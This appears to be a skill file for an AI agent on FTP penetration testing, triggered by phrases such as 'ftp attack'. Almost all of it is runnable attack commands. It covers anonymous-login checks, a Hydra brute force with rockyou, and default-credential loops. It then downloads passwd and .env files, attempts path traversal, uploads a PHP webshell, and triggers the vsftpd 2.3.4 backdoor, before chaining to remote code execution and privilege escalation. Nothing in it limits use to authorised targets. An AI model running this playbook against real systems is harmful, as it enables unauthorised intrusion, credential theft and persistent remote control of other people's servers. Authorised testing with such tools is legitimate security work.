---
name: proto-ftp
description: "FTP security testing — anonymous login, brute force, FTP bounce, PASV/PORT exploitation, clear-text sniffing, path traversal in FTP. Triggers: 'ftp', 'ftp security', 'ftp anonymous', 'ftp brute force', 'ftp pentest', 'ftp attack', 'ftp bounce', 'vsftpd backdoor'."
---

# FTP Security Testing

Test FTP for anonymous access, credential weaknesses, and configuration issues.

---

## Phase 1: Enumeration

```bash
TARGET="TARGET_IP"

# FTP banner and version:
nmap -p 21 -sV --script ftp-anon,ftp-bounce,ftp-brute,ftp-syst,ftp-vsftpd-backdoor \
  "$TARGET" 2>/dev/null | tee output/ftp_enum.txt

# Manual anonymous login test:
ftp -n "$TARGET" << 'EOF'
quote USER anonymous
quote PASS anonymous@anonymous.com
ls
quit
EOF

# Anonymous via curl:
curl -s --user "anonymous:anonymous" "ftp://$TARGET/" | tee output/ftp_anon_listing.txt
```

---

## Phase 2: Credential Testing

```bash
TARGET="TARGET_IP"

# Hydra brute force:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$TARGET \
  -t 4 -vV 2>&1 | tee output/ftp_brute.txt

# Common FTP credentials:
for CRED in "ftp:ftp" "admin:admin" "ftpuser:ftpuser" "user:user"; do
  USER=$(echo $CRED | cut -d: -f1)
  PASS=$(echo $CRED | cut -d: -f2)
  curl -s --user "$USER:$PASS" "ftp://$TARGET/" && echo "VALID: $CRED"
done | tee output/ftp_defaults.txt
```

---

## Phase 3: File Access & Exploitation

```bash
TARGET="TARGET_IP"
USER="ftp_user"
PASS="ftp_pass"

# List all files:
curl -s --user "$USER:$PASS" "ftp://$TARGET/" --list-only | tee output/ftp_listing.txt

# Download sensitive files:
curl -s --user "$USER:$PASS" "ftp://$TARGET/passwd" -o /tmp/ftp_passwd
curl -s --user "$USER:$PASS" "ftp://$TARGET/.env" -o /tmp/ftp_env

# Path traversal:
curl -s --user "$USER:$PASS" "ftp://$TARGET/../../../etc/passwd" 2>/dev/null

# Upload webshell (if writable):
echo "<?php system(\$_GET['cmd']); ?>" > /tmp/shell.php
curl -T /tmp/shell.php --user "$USER:$PASS" "ftp://$TARGET/web/shell.php" 2>/dev/null

# VSFTPD 2.3.4 backdoor (CVE-2011-2523):
# Trigger: send ":)" in username → opens shell on port 6200
nmap -p 21 --script ftp-vsftpd-backdoor "$TARGET"
```

---

## Output

Save to `output/`:
- `ftp_enum.txt` — version and security checks
- `ftp_anon_listing.txt` — anonymous file listing
- `ftp_brute.txt` — credential brute force results

## Next Phase

→ `vuln-rce` if webshell uploaded
→ `post-linux-privesc` after initial access
